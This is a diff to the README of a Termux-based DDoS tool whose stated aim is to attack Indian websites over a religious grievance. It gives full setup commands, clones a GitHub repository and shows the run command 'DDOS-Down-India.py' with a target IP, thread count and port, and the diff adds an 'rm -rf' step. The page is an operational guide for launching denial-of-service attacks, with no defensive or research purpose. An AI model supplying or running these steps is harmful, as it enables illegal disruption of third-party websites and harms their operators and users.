@@ -1,7 +1,7 @@
 # DDOS
 Our Target Indian Site For Respect Our Prophet Nabi Karim Sallallahu Alaihi Wasallam
 
-# 1st Time Run Or Install DDOS
+# 1st Time Run Or Install DDOS Command
 
 ```
 termux-setup-storage
@@ -17,6 +17,7 @@ python3 -m pip install --upgrade
 pkg install pip2
 pip2 install requests
 pip2 install mechanize
+rm -rf DDOS
 git clone https://github.com/Cyber-Nirob-Official/DDOS
 cd DDOS
 python DDOS-Down-India.py -s (IP) -t 135 -p 80
